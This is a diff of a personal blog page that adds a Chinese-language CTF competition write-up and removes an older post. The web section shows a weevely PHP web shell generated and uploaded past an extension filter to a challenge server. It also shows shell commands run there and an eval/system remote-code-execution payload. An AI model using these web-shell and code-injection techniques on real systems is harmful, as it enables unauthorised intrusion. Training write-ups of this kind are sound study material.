@@ -528,6 +528,132 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://junyu33.github.io/2022/07/21/easiestctf.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="丨junyu33丨">
+      <meta itemprop="description" content="flag{CU73_D3V1L}">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="现充|junyu33">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/21/easiestctf.html" class="post-title-link" itemprop="url">四川大学CTF实训杯wp</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-21 16:00:00 / 修改时间：15:51:13" itemprop="dateCreated datePublished" datetime="2022-07-21T16:00:00+08:00">2022-07-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Easy-Flag"><a href="#Easy-Flag" class="headerlink" title="Easy_Flag"></a>Easy_Flag</h3><p>ctrl+u，查看源代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>  <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">空空如也～</span><br><span class="line"><span class="comment">&lt;!--flag.php--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.oncontextmenu = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        event.returnValue = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&#x27;想看代码？&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">   </span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.onkeydown = <span class="built_in">document</span>.onkeyup = <span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> e = event || <span class="built_in">window</span>.event || <span class="built_in">arguments</span>.callee.caller.arguments[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (e &amp;&amp; e.keyCode == <span class="number">123</span>) &#123;</span></span><br><span class="line"><span class="javascript">            e.returnValue = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&#x27;没想到吧，这也不行？&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>按照提示查看/flag.php即可。</p>
+<h3 id="Easy-Button"><a href="#Easy-Button" class="headerlink" title="Easy_Button"></a>Easy_Button</h3><p>f12将<code>maxlength</code>改为50，hackbar里面随便post一个手机号。</p>
+<p>如<code>phone=12312312312</code></p>
+<h3 id="Easy-Browser"><a href="#Easy-Browser" class="headerlink" title="Easy_Browser"></a>Easy_Browser</h3><p>查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    页面什么也没有</span><br><span class="line">    <span class="comment">&lt;!--看看cookie里有什么--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>按照提示查看cookie</p>
+<p><img src="/2022/07/21/easiestctf/1.png"></p>
+<p>访问/get.php，要求提交一个参数名为flag，参数值为1的数据。</p>
+<p><code>/get.php?flag=1</code></p>
+<h3 id="旋转的木马"><a href="#旋转的木马" class="headerlink" title="旋转的木马"></a>旋转的木马</h3><p>盲猜upload.php，发现提供了上传图片的按钮。</p>
+<p>我这里是linux，没法装蚁剑，这里使用weevely。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate 1234 ./114514.php</span><br><span class="line">mv 114514.php 114514.jpg</span><br></pre></td></tr></table></figure>
+<p>提交时使用burp抓包，将后缀再改回php即可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://47.116.24.9:81/upload/114514.php 1234</span><br></pre></td></tr></table></figure>
+<p>进入shell之后</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cat flag_859421239.txt</span><br></pre></td></tr></table></figure>
+<h3 id="抽奖游戏"><a href="#抽奖游戏" class="headerlink" title="抽奖游戏"></a>抽奖游戏</h3><p>抽奖之后抓包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ctf4/check.php?tar=12&amp;sign=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.116.24.9</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.116.24.9/ctf4/game.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sign=md5(tar)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+<p>盲猜<code>tar=flag</code>，然后<code>sign=md5(&#39;flag&#39;)=327a6c4304ad5938eaf0efb6cc3e53dc</code></p>
+<p>把<code>GET</code>参数修改后提交即可。</p>
+<h3 id="Rceeeee"><a href="#Rceeeee" class="headerlink" title="Rceeeee"></a>Rceeeee</h3><p>过滤逃逸：     </p>
+<p><code>?data=eval($_GET[1]);&amp;1=system(&#39;ls&#39;);</code>            </p>
+<p>剩下的自己看着办。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="葫芦娃"><a href="#葫芦娃" class="headerlink" title="葫芦娃"></a>葫芦娃</h3><p>解压后改png图片高度。</p>
+<p><img src="/2022/07/21/easiestctf/2.png"></p>
+<h3 id="File-Error"><a href="#File-Error" class="headerlink" title="File_Error"></a>File_Error</h3><p>这是一个zip文件，是一个伪加密。</p>
+<p><img src="/2022/07/21/easiestctf/3.png"></p>
+<h3 id="shark"><a href="#shark" class="headerlink" title="shark"></a>shark</h3><p>题目说flag只靠搜，那就直接搜呗。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat webone.pcap | grep -a flag</span><br></pre></td></tr></table></figure>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>urldecode</p>
+<p><a target="_blank" rel="noopener" href="https://www.urldecoder.io/">https://www.urldecoder.io/</a></p>
+<h3 id="栅栏围墙"><a href="#栅栏围墙" class="headerlink" title="栅栏围墙"></a>栅栏围墙</h3><p>栅栏密码</p>
+<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>
+<p>每组字数9</p>
+<h3 id="罗密欧与朱丽叶"><a href="#罗密欧与朱丽叶" class="headerlink" title="罗密欧与朱丽叶"></a>罗密欧与朱丽叶</h3><p>盲文密码、猪圈密码和圣堂武士密码的结合，一个一个解就行。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://junyu33.github.io/2022/07/06/anniversary.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -914,104 +1040,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2022/04/23/surgery.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://junyu33.github.io/2022/04/15/bye_baidu.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="丨junyu33丨">
-      <meta itemprop="description" content="flag{CU73_D3V1L}">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="现充|junyu33">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/15/bye_baidu.html" class="post-title-link" itemprop="url">twenty-five——bye, Baidu</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-04-15 12:30:00 / 修改时间：13:15:26" itemprop="dateCreated datePublished" datetime="2022-04-15T12:30:00+08:00">2022-04-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
-        </span>
-    </span>
-
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>3.1k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>My English presentation on 4/14/2022.</p>
-<p><img src="/2022/04/15/bye_baidu/1.png"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/04/15/bye_baidu.html#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
